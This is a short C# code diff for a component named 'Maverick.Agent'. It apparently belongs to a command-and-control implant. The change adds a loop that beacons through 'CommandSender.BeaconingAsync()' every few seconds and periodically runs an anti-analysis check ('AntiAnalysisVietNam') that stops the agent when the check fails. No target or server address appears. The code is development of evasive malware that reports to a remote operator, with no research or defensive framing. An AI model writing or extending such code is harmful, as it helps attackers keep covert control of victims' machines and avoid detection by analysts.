@@ -34,19 +34,24 @@ namespace Maverick.Agent
             int num = 0;
             while(Program.isConnected)
             {
-                Thread.Sleep(1000);
+                Thread.Sleep(5000);
                 num++;
                 if (num >= 30)
                 {
                     if (!AntiAnalysisVietNam.ShouldContinueExecution())
                     {
-
+                        isConnected = false;
                     }
+                    num = 0;
                 }
+                _ = Task.Run(async () =>
+                {
+                    await CommandSender.BeaconingAsync();
+                });
             }
 
         }
         
-        private static bool isConnected;
+        private static bool isConnected = true;
     }
 }
